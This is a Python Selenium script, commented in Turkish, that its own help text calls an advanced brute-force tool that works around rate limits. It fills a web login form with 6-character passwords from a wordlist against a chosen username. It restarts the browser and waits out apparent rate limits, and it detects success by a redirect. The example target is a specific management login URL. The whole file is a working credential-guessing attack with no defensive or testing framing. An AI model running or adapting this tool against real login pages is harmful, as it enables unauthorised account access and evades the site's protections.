import argparse
import sys
import time
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.firefox import GeckoDriverManager

def setup_browser_session(url):
    """
    Yeni bir tarayıcı oturumu başlatır, sayfayı açar, bekler ve giriş elementlerini bulur.
    """
    print("\n[*] Yeni bir tarayıcı oturumu başlatılıyor...")
    service = FirefoxService(GeckoDriverManager().install())
    driver = webdriver.Firefox(service=service)
    
    driver.get(url)
    print("[*] Sayfa yüklendi. Başlangıç animasyonları için 30 saniye bekleniyor...")
    time.sleep(30)
    
    wait = WebDriverWait(driver, 15)
    
    PASSWORD_SELECTOR = (By.CSS_SELECTOR, "input[type='password']")
    password_field = wait.until(EC.visibility_of_element_located(PASSWORD_SELECTOR))
    
    USERNAME_SELECTOR = (By.XPATH, "//input[@type='password']/preceding::input[1]")
    username_field = wait.until(EC.visibility_of_element_located(USERNAME_SELECTOR))
    
    LOGIN_BUTTON_SELECTOR = (By.CSS_SELECTOR, "button[type='submit']")
    login_button = wait.until(EC.element_to_be_clickable(LOGIN_BUTTON_SELECTOR))
    
    print("[*] Giriş elementleri bulundu.")
    return driver, username_field, password_field, login_button


def main():
    parser = argparse.ArgumentParser(description='Rate Limit Uyumlu, Gelişmiş Selenium Bruteforce Aracı.')
    parser.add_argument('url', help='Hedef web sitesinin URL\'si (örn: https://mgmt.yenihavale.net/login)')
    parser.add_argument('-u', '--username', required=True, help='Kullanılacak kullanıcı adı.')
    parser.add_argument('-w', '--wordlist', required=True, help='Denenecek şifrelerin bulunduğu dosya.')

    args = parser.parse_args()

    print(f"[*] Hedef: {args.url}")
    print(f"[*] Kullanıcı Adı: {args.username}")
    print(f"[*] Şifre Listesi: {args.wordlist}")

    try:
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            all_passwords = [line.strip() for line in f if line.strip()]
        
        passwords = [p for p in all_passwords if len(p) == 6]
        
        print(f"[*] Kelime listesindeki toplam {len(all_passwords)} şifreden, {len(passwords)} tanesi 6 haneli olarak filtrelendi.")

        if not passwords:
            print("[!] Hata: Belirtilen listede 6 haneli şifre bulunamadı.", file=sys.stderr)
            sys.exit(1)

    except FileNotFoundError:
        print(f"Hata: '{args.wordlist}' kelime listesi dosyası bulunamadı.", file=sys.stderr)
        sys.exit(1)

    current_password_index = 0
    found_password = None
    driver = None

    while current_password_index < len(passwords) and not found_password:
        try:
            driver, username_field, password_field, login_button = setup_browser_session(args.url)
            username_field.send_keys(args.username)
            print(f"[*] Denemelere {current_password_index}. şifreden devam ediliyor...")

            for i in range(current_password_index, len(passwords)):
                password = passwords[i]
                current_password_index = i
                
                print(f"[*] Denenen: {password}", end='\r')
                
                password_field.clear()
                password_field.send_keys(password)
                login_button.click()
                
                try:
                    WebDriverWait(driver, 3).until(lambda d: args.url not in d.current_url)
                    
                    current_url = driver.current_url
                    print(f"\n\n[+] BAŞARILI! Şifre bulundu: {password}")
                    print(f"    -> Yönlendirilen URL: {current_url}")
                    found_password = password
                    print("Tarayıcı 30 saniye sonra kapanacak...")
                    time.sleep(30)
                    break 
                except TimeoutException:
                    continue

        except Exception as e:
            print(f"\n[!] Oturumda bir hata oluştu (Muhtemel Rate Limit): {type(e).__name__}")
            current_password_index += 1

        finally:
            if driver:
                driver.quit()
                print("[*] Tarayıcı oturumu kapatıldı.")
        
        if not found_password and current_password_index < len(passwords):
            print("[!] Rate limit için 60 saniye bekleniyor...")
            time.sleep(60)

    if not found_password:
        print("\n[-] Tüm denemeler bitti. Şifre bulunamadı.")
    
    print("[*] Araç kapatıldı.")

if __name__ == '__main__':
    main() 